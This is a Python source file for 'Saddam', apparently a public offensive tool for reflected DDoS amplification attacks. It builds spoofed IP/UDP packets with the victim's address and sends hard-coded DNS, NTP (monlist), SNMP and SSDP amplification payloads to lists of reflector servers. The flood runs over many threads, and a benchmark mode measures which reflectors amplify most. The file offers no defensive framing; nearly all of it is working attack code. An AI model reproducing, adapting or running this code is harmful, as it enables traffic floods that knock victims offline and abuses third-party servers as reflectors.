#!/usr/bin/env python
import sys
import time
import socket
import struct
import threading
from random import randint
from optparse import OptionParser
from pinject import IP, UDP

USAGE = '''
%prog target.com [options]        # DDoS
%prog benchmark [options]         # Calculate AMPLIFICATION factor
'''

LOGO = r'''
       _____           __    __              
      / ___/____ _____/ /___/ /___ _____ ___ 
      \__ \/ __ `/ __  / __  / __ `/ __ `__ \
     ___/ / /_/ / /_/ / /_/ / /_/ / / / / / /
    /____/\__,_/\__,_/\__,_/\__,_/_/ /_/ /_/ 
    https://github.com/OffensivePython/Saddam
       https://twitter.com/OffensivePython
'''

HELP = (
    'DNS Amplification File and Domains to Resolve (e.g: dns.txt:[evildomain.com|domains_file.txt]',
    'NTP Amplification file',
    'SNMP Amplification file',
    'SSDP Amplification file',
    'Number of threads (default=1)' )

OPTIONS = (
    (('-d', '--dns'), dict(dest='dns', metavar='FILE:FILE|DOMAIN', help=HELP[0])),
    (('-n', '--ntp'), dict(dest='ntp', metavar='FILE', help=HELP[1])),
    (('-s', '--snmp'), dict(dest='snmp', metavar='FILE', help=HELP[2])),
    (('-p', '--ssdp'), dict(dest='ssdp', metavar='FILE', help=HELP[3])),
    (('-t', '--threads'), dict(dest='threads', type=int, default=1, metavar='N', help=HELP[4])) )

BENCHMARK = (
    'Protocol'
    '|  IP  Address  '
    '|     Amplification     '
    '|     Domain    '
    '\n{}').format('-'*75)

ATTACK = (
    '     Sent      '
    '|    Traffic    '
    '|    Packet/s   '
    '|     Bit/s     '
    '\n{}').format('-'*63)

PORT = {
    'dns': 53,
    'ntp': 123,
    'snmp': 161,
    'ssdp': 1900 }

PAYLOAD = {
    'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
            '{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
            '\x00\x00\x00\x00\x00\x00'),
    'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
        '\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
        '\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
        '\x01\x02\x01\x05\x00'),
    'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
    'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
        'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
}

amplification = {
    'dns': {},
    'ntp': {},
    'snmp': {},
    'ssdp': {} }		# Amplification factor

FILE_NAME = 0			# Index of files names
FILE_HANDLE = 1 		# Index of files descriptors

npackets = 0			# Number of packets sent
nbytes = 0				# Number of bytes reflected
files = {}				# Amplifications files

SUFFIX = {
    0: '',
    1: 'K',
    2: 'M',
    3: 'G',
    4: 'T'}

def Calc(n, d, unit=''):
    i = 0
    r = float(n)
    while r/d >= 1:
        r = r/d
        i += 1
    return '{:.2f}{}{}'.format(r, SUFFIX[i], unit)

def GetDomainList(domains):
    domain_list = []

    if '.TXT' in domains.upper():
        file = open(domains, 'r')
        content = file.read()
        file.close()
        content = content.replace('\r', '')
        content = content.replace(' ', '')
        content = content.split('\n')
        for domain in content:
            if domain:
                domain_list.append(domain)
    else:
        domain_list = domains.split(',')
    return domain_list

def Monitor():
    '''
        Monitor attack
    '''
    print ATTACK
    FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
    start = time.time()
    while True:
        try:
            current = time.time() - start
            bps = (nbytes*8) / current
            pps = npackets / current
            out = FMT.format(Calc(npackets, 1000), 
                Calc(nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
            sys.stderr.write('\r{}{}'.format(out, ' '*(60-len(out))))
            time.sleep(1)
        except KeyboardInterrupt:
            print '\nInterrupted'
            break
        except Exception as err:
            print '\nError:', str(err)
            break

def AmpFactor(recvd, sent):
    return '{}x ({}B -> {}B)'.format(recvd/sent, sent, recvd)

def Benchmark(ddos):
    print BENCHMARK
    i = 0
    for proto in files:
        f = open(files[proto][FILE_NAME], 'r')
        while True:
            soldier = f.readline().strip()
            if soldier:
                if proto == 'dns':
                    for domain in ddos.domains:
                        i += 1
                        recvd, sent = ddos.GetAmpSize(proto, soldier, domain)
                        if recvd/sent:
                            print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
                                AmpFactor(recvd, sent), domain)
                        else:
                            continue
                else:
                    recvd, sent = ddos.GetAmpSize(proto, soldier)
                    print '{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
                        AmpFactor(recvd, sent), 'N/A')
                    i += 1
            else:
                break
        print 'Total tested:', i
        f.close()

class DDoS(object):
    def __init__(self, target, threads, domains, event):
        self.target = target
        self.threads = threads
        self.event = event
        self.domains = domains

    def stress(self):
        for i in range(self.threads):
            t = threading.Thread(target=self.__attack)
            t.start()

    def __send(self, sock, soldier, proto, payload):
        '''
            Send a Spoofed Packet
        '''
        udp = UDP(randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
        ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
        sock.sendto(ip+udp+payload, (soldier, PORT[proto]))

    def GetAmpSize(self, proto, soldier, domain=''):
        '''
            Get Amplification Size
        '''
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        data = ''
        if proto in ['ntp', 'ssdp']:
            packet = PAYLOAD[proto]
            sock.sendto(packet, (soldier, PORT[proto]))
            try:
                while True:
                    data += sock.recvfrom(65535)[0]
            except socket.timeout:
                sock.close()
                return len(data), len(packet)
        if proto == 'dns':
            packet = self.__GetDnsQuery(domain)
        else:
            packet = PAYLOAD[proto]
        try:
            sock.sendto(packet, (soldier, PORT[proto]))
            data, _ = sock.recvfrom(65535)
        except socket.timeout:
            data = ''
        finally:
            sock.close()
        return len(data), len(packet)

    def __GetQName(self, domain):
        '''
            QNAME A domain name represented as a sequence of labels 
            where each label consists of a length octet followed by that number of octets
        '''
        labels = domain.split('.')
        QName = ''
        for label in labels:
            if len(label):
                QName += struct.pack('B', len(label)) + label
        return QName

    def __GetDnsQuery(self, domain):
        id = struct.pack('H', randint(0, 65535))
        QName = self.__GetQName(domain)
        return struct.pack('!HHHHHH', int(id), 0x0100, 1, 0, 0, 0) + QName + struct.pack('!H', 0x0001) + struct.pack('!H', 0x0001)
        
    def __attack(self):
        '''
            DDoS
        '''
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.event.wait()
        while True:
            for proto in files:
                for soldier in files[proto][FILE_HANDLE]:
                    if proto == 'dns':
                        for domain in self.domains:
                            self.__send(sock, soldier, proto, self.__GetDnsQuery(domain))
                    else:
                        self.__send(sock, soldier, proto, PAYLOAD[proto])

def main():
    print LOGO
    parser = OptionParser(usage=USAGE)
    for opt in OPTIONS:
        parser.add_option(opt[0], **opt[1])

    (options, args) = parser.parse_args()

    if len(args) != 1:
        print '\nError: Missing argument'
        sys.exit(1)

    target = args[0]
    event = threading.Event()

    if options.dns:
        files['dns'] = (options.dns, GetDomainList(options.dns))
    if options.ntp:
        files['ntp'] = (options.ntp, open(options.ntp, 'r').readlines())
    if options.snmp:
        files['snmp'] = (options.snmp, open(options.snmp, 'r').readlines())
    if options.ssdp:
        files['ssdp'] = (options.ssdp, open(options.ssdp, 'r').readlines())

    ddos = DDoS(target, options.threads, files['dns'][FILE_HANDLE], event)
    if args[0] == 'benchmark':
        Benchmark(ddos)
        sys.exit(0)

    ddos.stress()
    Monitor()

if __name__ == '__main__':
    main()
